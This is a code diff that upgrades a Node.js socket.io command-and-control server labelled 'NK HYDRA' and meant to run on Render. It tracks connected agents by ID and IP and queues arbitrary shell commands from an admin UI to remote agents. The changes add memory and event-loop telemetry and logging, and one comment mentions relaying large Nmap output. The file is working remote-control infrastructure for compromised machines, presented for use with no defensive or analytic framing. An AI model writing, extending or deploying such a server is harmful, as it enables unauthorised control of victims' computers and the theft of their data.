@@ -1,49 +1,108 @@
 // TYPE: NODE.JS C2 SERVER (RUN ON RENDER)
-// NK HYDRA v134.0 [STABLE QUEUE + SINGULARITY SUPPORT + ANTI-CRASH]
+// NK HYDRA v201.0 [SINGULARITY WATCHDOG + DEEP DIAGNOSTICS]
 
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
 
-// --- ANTI-CRASH HANDLERS (CRITICAL) ---
+// --- 1. SYSTEM MONITOR (WATCHDOG BRAIN) ---
+const getSystemMetrics = () => {
+    const mem = process.memoryUsage();
+    return {
+        uptime: process.uptime(),
+        memory_usage_mb: Math.round(mem.heapUsed / 1024 / 1024),
+        cpu_load_percent: 0, // Node.js doesn't give direct CPU %, processed via Event Loop Lag
+        event_loop_lag_ms: measureEventLoopLag(),
+        active_sockets: 0 // Filled later
+    };
+};
+
+// Simple event loop lag measure
+let lastLoop = Date.now();
+let currentLag = 0;
+setInterval(() => {
+    const now = Date.now();
+    currentLag = now - lastLoop - 100; // 100ms interval
+    if (currentLag < 0) currentLag = 0;
+    lastLoop = now;
+}, 100);
+const measureEventLoopLag = () => currentLag;
+
+// --- ANTI-CRASH HANDLERS ---
 process.on('uncaughtException', (err) => {
     console.error('CRITICAL: Uncaught Exception:', err);
-    // Do NOT exit process on Render
+    logToAdmin('CRITICAL', 'Uncaught Exception: ' + err.message);
 });
 
 process.on('unhandledRejection', (reason, promise) => {
     console.error('CRITICAL: Unhandled Rejection:', reason);
+    logToAdmin('CRITICAL', 'Unhandled Rejection: ' + String(reason));
 });
 
 const app = express();
 app.use(cors());
 
-// Health Check Endpoint for Ping Services (Keep Render Awake)
+// Health Check
 app.get('/health', (req, res) => { res.status(200).send('OK'); });
 app.get('/', (req, res) => { 
     res.json({ 
         status: 'online', 
-        version: 'v134.0', 
-        agents: agents.length,
-        queue: commandQueue.length
+        version: 'v201.0', 
+        telemetry: getSystemMetrics(),
+        agents: agents.length
     }); 
 });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
     cors: { origin: "*", methods: ["GET", "POST"] },
-    pingInterval: 25000, 
-    pingTimeout: 60000,
-    maxHttpBufferSize: 1e8, // 100MB Limit (Prevents crash on large Nmap output)
+    pingInterval: 10000, // Faster pings to detect drops
+    pingTimeout: 30000,
+    maxHttpBufferSize: 1e8, // 100MB Buffer
     transports: ['polling', 'websocket'] 
 });
 
 let agents = []; 
 const commandQueue = [];
-let isProcessingQueue = false;
+let adminSocket = null; // The NK UI
 
-// --- QUEUE PROCESSOR ---
+// --- DEEP LOGGING ---
+const logToAdmin = (level, message, details = {}) => {
+    const logEntry = {
+        timestamp: Date.now(),
+        source: 'C2_KERNEL',
+        level,
+        message,
+        details
+    };
+    if (adminSocket) {
+        adminSocket.emit('agent_event', {
+            type: 'TELEMETRY',
+            agentId: 'C2',
+            payload: logEntry
+        });
+    }
+    console.log(`[${level}] ${message}`);
+};
+
+// --- TRAFFIC CONTROLLER (PREVENT FLOOD) ---
+// If queue is huge, pause processing or warn NK
+setInterval(() => {
+    const metrics = getSystemMetrics();
+    metrics.active_sockets = io.engine.clientsCount;
+    
+    if (metrics.memory_usage_mb > 400) {
+        logToAdmin('WARNING', 'High Memory Usage Detected', metrics);
+    }
+    
+    // Broadcast Health to UI every 5s
+    if (adminSocket) {
+        adminSocket.emit('c2_health', metrics);
+    }
+}, 5000);
+
+let isProcessingQueue = false;
 const processQueue = async () => {
     if (isProcessingQueue || commandQueue.length === 0) return;
     isProcessingQueue = true;
@@ -57,18 +116,13 @@ const processQueue = async () => {
                 } else {
                     const agent = agents.find(a => a.id === task.targetId);
                     if (agent && agent.socketId) {
-                         try {
-                             io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
-                         } catch (err) {
-                             console.error("Socket Emit Failed (Agent likely disconnected):", err);
-                         }
+                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                     }
                 }
             } catch (e) {
-                console.error("Queue Exec Error:", e);
+                logToAdmin('ERROR', 'Queue Execution Failed', { error: e.message });
             }
         }
-        // Throttle to prevent flooding
         await new Promise(r => setTimeout(r, 200)); 
     }
     isProcessingQueue = false;
@@ -76,23 +130,26 @@ const processQueue = async () => {
 
 io.on('connection', (socket) => {
     
-    // --- HEARTBEAT HANDLER ---
     socket.on('heartbeat', (data) => {
         const agent = agents.find(a => a.socketId === socket.id);
-        if (agent) agent.lastSeen = Date.now();
+        if (agent) {
+            agent.lastSeen = Date.now();
+            if (data.cpu) agent.cpu = data.cpu;
+            if (data.ram) agent.ram = data.ram;
+        }
     });
 
     socket.on('identify', (data) => {
         try {
             if (data.type === 'ui') {
                 socket.join('ui_room');
+                adminSocket = socket;
                 socket.emit('agents_list', agents);
+                logToAdmin('INFO', 'NK UI Connected (God Mode Active)');
                 return;
             }
 
-            // Remove existing agent with same ID (reconnection)
             agents = agents.filter(a => a.id !== data.id);
-            
             agents.push({ 
                 ...data, 
                 socketId: socket.id, 
@@ -101,9 +158,8 @@ io.on('connection', (socket) => {
             });
             
             io.to('ui_room').emit('agents_list', agents);
-            console.log(`[+] Agent Online: ${data.id}`);
+            logToAdmin('SUCCESS', `Agent Connected: ${data.id}`, { ip: data.ip });
             
-            // Re-process queue if agents come online
             if(commandQueue.length > 0) processQueue();
 
         } catch (e) {
@@ -114,10 +170,10 @@ io.on('connection', (socket) => {
     socket.on('exec_cmd', (data) => {
         try {
             const { targetId, cmd } = data;
-            const id = Date.now().toString(); // Command ID
+            const id = Date.now().toString(); 
             commandQueue.push({ targetId, cmd, id });
             
-            io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `Queued: ${cmd}` });
+            logToAdmin('INFO', `Command Queued: ${cmd}`, { target: targetId });
             processQueue();
 
         } catch (e) { console.error("Exec Error:", e); }
@@ -125,18 +181,22 @@ io.on('connection', (socket) => {
     
     socket.on('agent_event', (data) => {
         try {
+            // RELAY TO UI
             io.to('ui_room').emit('agent_event', data);
         } catch (e) { console.error("Relay Error:", e); }
     });
 
-    socket.on('disconnect', () => {
+    socket.on('disconnect', (reason) => {
         const agent = agents.find(a => a.socketId === socket.id);
         if (agent) { 
             agent.status = 'Offline'; 
             io.to('ui_room').emit('agents_list', agents);
+            logToAdmin('WARNING', `Agent Disconnected: ${agent.id}`, { reason });
+        } else if (socket === adminSocket) {
+            adminSocket = null;
         }
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v134 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v201 LISTENING ON ${PORT}`));
